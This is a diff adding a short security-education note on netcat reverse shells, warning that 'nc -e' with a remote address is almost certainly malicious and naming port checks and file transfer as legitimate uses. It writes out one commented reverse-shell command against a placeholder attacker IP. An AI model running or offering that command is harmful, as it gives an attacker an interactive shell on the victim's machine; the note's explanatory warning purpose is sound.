@@ -1,0 +1,13 @@
+# nc reverse shell: what it is and why it's dangerous
+
+Security education note:
+
+A netcat reverse shell uses nc with the -e flag to attach a shell to a network connection:
+    # DANGEROUS — this is what attackers do:
+    # nc -e /bin/bash <attacker_ip> <port>   # DO NOT RUN
+
+This is blocked by security tools for good reason: it gives an attacker an interactive shell with your user's privileges.
+
+Modern versions of nc (BSD/macOS default) do NOT support -e. The -e flag was removed specifically because of this misuse.
+
+Legitimate uses of nc never need -e. If a script or command tells you to run nc with -e and a remote IP, it is almost certainly malicious. Port checking (nc -z) and file transfer (nc host port < file) are the legitimate use cases.
